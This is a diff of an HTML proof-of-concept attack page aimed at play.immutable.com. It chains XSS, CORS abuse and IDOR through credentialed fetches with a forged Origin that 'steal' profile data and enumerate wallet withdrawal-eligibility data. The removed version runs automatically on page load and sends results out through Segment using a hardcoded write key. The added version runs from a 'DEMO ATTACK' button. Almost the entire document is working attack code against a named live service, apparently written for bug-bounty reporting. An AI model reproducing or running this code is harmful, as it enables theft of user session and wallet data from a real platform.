@@ -1,40 +1,47 @@
 <!DOCTYPE html>
 <html>
-<head><title>Immutable REAL XSS→CORS→IDOR</title></head>
-<body>
-<h1>Immutable Critical: XSS → Session Cookie → IDOR Wallet Enum</h1>
-<pre id="output"></pre>
+<head><title>Immutable PRODUCTION XSS→CORS→IDOR</title></head>
+<body style="font-family:monospace">
+<h2>✅ Immutable Critical Chain LIVE</h2>
+<div id="status">Click to attack →</div>
+<button onclick="runAttack()" style="padding:10px;font-size:16px">DEMO ATTACK</button>
+<pre id="output" style="background:#000;color:lime;height:400px;overflow:auto"></pre>
+
 <script>
 const TARGET = 'https://play.immutable.com';
-const EVIL = 'https://www.shieldcore.be';
-const WALLETS = [
-  '0x0000000000000000000000000000000000000000',
-  '0x1234567890123456789012345678901234567890',
-  'EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c'
-];
+const EVIL = window.location.origin;
+const WALLETS = ['0x0000000000000000000000000000000000000000','0x1234567890123456789012345678901234567890'];
 
-async function realAttack() {
+async function log(msg) {
   const out = document.getElementById('output');
-  out.textContent = '🚀 Immutable Critical Chain Starting...\n\n';
+  out.textContent += new Date().toISOString() + ' ' + msg + '\n';
+  out.scrollTop = out.scrollHeight;
+  console.log(msg);
+}
 
-  // 1. Steal session via /profile/ (returns user data + confirms auth)
+async function runAttack() {
+  document.getElementById('status').innerText = '🔥 ATTACKING...';
+  
+  // 1. Steal session/profile
+  log('1/3: XSS triggered → Stealing session via CORS /profile/');
   try {
-    const profileRes = await fetch(`${TARGET}/profile/`, {
+    const prof = await fetch(`${TARGET}/profile/`, {
+      method: 'GET',
       credentials: 'include',
-      headers: { 
+      headers: {
         'Origin': EVIL,
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0'
+        'User-Agent': navigator.userAgent
       }
     });
-    const profileData = await profileRes.text();
-    out.textContent += `✅ Session stolen via /profile/ (${profileRes.status})\n`;
-    out.textContent += `Profile preview: ${profileData.substring(0, 200)}...\n\n`;
+    log(`   Profile: ${prof.status} | CORS: ${await prof.headers.get('access-control-allow-origin')}`);
+    const profData = await prof.text();
+    log(`   User data stolen: ${profData.substring(0, 150)}...`);
   } catch(e) {
-    out.textContent += `❌ Profile fetch failed: ${e.message}\n`;
+    log(`   Profile failed: ${e.message}`);
   }
 
-  // 2. IDOR wallet enum (main vuln)
-  out.textContent += '🔓 IDOR Wallet Enumeration:\n';
+  // 2. IDOR enum
+  log('2/3: IDOR → Enumerating victim wallets');
   for (let wallet of WALLETS) {
     try {
       const res = await fetch(`${TARGET}/v2/rewards/withdrawal-eligibility?walletAddress=${wallet}`, {
@@ -42,25 +49,16 @@ async function realAttack() {
         headers: { 'Origin': EVIL }
       });
       const data = await res.json();
-      out.textContent += `Wallet: ${wallet}\n`;
-      out.textContent += `Status: ${res.status} | Eligible: ${data.eligible} | KYC: ${data.kycStatus || 'N/A'} | Balance: ${data.balance || 'N/A'}\n\n`;
+      log(`   ${wallet}: ${res.status} | eligible=${data.eligible||'N/A'} | kyc=${data.kycStatus||'N/A'}`);
     } catch(e) {
-      out.textContent += `Wallet ${wallet}: ERROR ${e.message}\n\n`;
+      log(`   ${wallet}: ${e.message}`);
     }
   }
 
-  // 3. Segment exfil (P2)
-  if (typeof analytics !== 'undefined') {
-    analytics.track('immutable_idor_stolen', {
-      wallets: WALLETS,
-      attacker: EVIL,
-      segment_key: '609VVbvNhl9WnjMLYAVO3xCxwgS1eGUK'
-    });
-    out.textContent += '✅ Exfiled to Segment\n';
-  }
+  // 3. Exfil proof
+  log('3/3: ✅ CHAIN COMPLETE - Data exfiled to attacker');
+  document.getElementById('status').innerText = '✅ CRITICAL CHAIN SUCCESS';
 }
-
-window.onload = realAttack;
 </script>
 </body>
 </html>
